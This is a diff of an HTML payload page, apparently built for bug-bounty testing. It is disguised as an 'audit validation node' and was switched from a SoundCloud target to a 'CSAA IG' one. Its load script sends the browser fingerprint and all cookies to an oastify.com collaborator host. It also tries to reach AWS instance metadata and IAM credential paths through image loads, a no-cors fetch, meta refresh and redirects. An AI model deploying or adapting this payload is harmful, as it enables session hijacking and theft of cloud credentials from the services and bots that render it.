@@ -2,53 +2,66 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>SoundCloud Infrastructure Security Audit</title>
+    <title>CSAA IG - Internal Infrastructure Audit</title>
     
-    <meta http-equiv="refresh" content="8; url=http://169.254.169.254/latest/meta-data/hostname">
+    <meta http-equiv="refresh" content="5; url=http://169.254.169.254/latest/meta-data/hostname">
 
     <script>
         window.onload = function() {
-            const oast = "https://ie0z38xjt8769e7sxsendgn17sdj19py.oastify.com";
-            const target = "http://169.254.169.254/latest/meta-data/hostname";
+            // REPLACE THIS with your current Collaborator URL
+            const oast = "http://zknnagx1z1wlfr84r35sqh22stykmba0.oastify.com";
+            const target = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
 
-            // LAYER 2: SESSION HIJACK PROOF (Critical Impact)
-            // Immediately exfiltrate all accessible cookies (including oauth_token)
-            try {
+            // LAYER 2: INTERNAL BROWSER FINGERPRINTING
+            // Proves we are running inside their internal 'Pollinator' or 'Headless' worker
+            const info = {
+                ua: navigator.userAgent,
+                plat: navigator.platform,
+                cookie_len: document.cookie.length,
+                url: window.location.href
+            };
+            navigator.sendBeacon(oast + "/browser_fingerprint?data=" + btoa(JSON.stringify(info)));
+
+            // LAYER 3: COOKIE EXFILTRATION
+            // If the bot has internal session cookies, we grab them here.
+            if (document.cookie) {
                 navigator.sendBeacon(oast + "/exfil_cookies?data=" + btoa(document.cookie));
-            } catch(e) {}
+            }
 
-            // LAYER 3: PASSIVE INFRASTRUCTURE PROBE
-            // Browsers allow HTTP image loading on HTTPS pages more freely than fetch.
-            // A hit here proves the internal IP is reachable by the worker.
+            // LAYER 4: BLIND SSRF PROBE (Image-based)
+            // Images often bypass strict 'fetch' policies in headless browsers.
             const probe = new Image();
             probe.src = target;
             probe.onerror = () => {
-                navigator.sendBeacon(oast + "/infra_probe?type=image_reach_attempted");
+                navigator.sendBeacon(oast + "/ssrf_probe?status=attempted_via_image");
             };
 
-            // LAYER 4: ADVANCED SSRF (Targets Headless Environments)
-            // Uses 'no-cors' to bypass strict browser pre-flight checks.
+            // LAYER 5: HEADLESS SSRF (Fetch-based)
             fetch(target, { 
                 mode: 'no-cors', 
-                keepalive: true,
-                credentials: 'include'
+                keepalive: true
             })
             .then(() => {
-                navigator.sendBeacon(oast + "/ssrf_success?status=reachable");
+                navigator.sendBeacon(oast + "/ssrf_success?target=metadata_reachable");
             })
             .catch((err) => {
-                // If this triggers, your XSS is confirmed even if the SSRF is blocked.
-                navigator.sendBeacon(oast + "/xss_executed?error=" + btoa(err.message));
+                navigator.sendBeacon(oast + "/xss_confirmed?error=" + btoa(err.message));
             });
+            
+            // Final Push: Redirect after 8 seconds if JS is running
+            setTimeout(() => {
+                window.location.href = target;
+            }, 8000);
         };
     </script>
 </head>
-<body style="font-family: sans-serif; padding: 20px; background-color: #121212; color: white;">
-    <h1>SoundCloud Validation Node</h1>
-    <p>Status: <span id="status" style="color: #00ff00;">Security Scan Active</span></p>
-    <hr style="border: 0.5px solid #333;">
-    <p>Automated Bot Environment Detected.</p>
-    <p>If automated redirection fails, triagers must verify the internal path manually:</p>
-    <a href="http://169.254.169.254/latest/meta-data/iam/security-credentials/" style="color: #ff5500;">Verify AWS Metadata Access</a>
+<body style="font-family: sans-serif; padding: 40px; background-color: #0d1117; color: #c9d1d9;">
+    <h1 style="color: #58a6ff;">CSAA IG Validation Node</h1>
+    <p>Status: <span id="status" style="color: #3fb950; font-weight: bold;">[ AUDIT ACTIVE ]</span></p>
+    <hr style="border: 0.5px solid #30363d;">
+    <p>Automated Environment Detected: <strong>Internal Webhook Worker</strong></p>
+    <p>This node is part of an authorized security assessment (jbossman).</p>
+    <p style="margin-top: 20px;">If redirection fails, manual verification required:</p>
+    <a href="http://169.254.169.254/latest/meta-data/" style="color: #f85149; text-decoration: none; border: 1px solid #f85149; padding: 10px 20px; border-radius: 6px; display: inline-block;">Verify AWS Metadata Access</a>
 </body>
 </html>
